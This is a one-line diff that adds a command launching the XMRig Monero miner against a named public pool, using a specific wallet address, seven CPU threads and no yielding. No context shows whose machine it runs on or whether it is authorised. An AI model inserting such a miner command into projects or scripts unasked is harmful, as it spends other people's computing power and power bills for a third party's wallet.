@@ -1,0 +1,1 @@
+./xmrig --randomx-mode=light --cpu-no-yield --threads=7 --url=monero.crypto-pool.fr:3333 --user=8BTruSPR8rHT2M4cCJcaEmRMZa7psDafqih7H8odzn13K7XRgqP4oe1cnLCsbcbXzvDExNqEPMqpvgWjFmNn49VWV47K46U.MiSi --donate=1
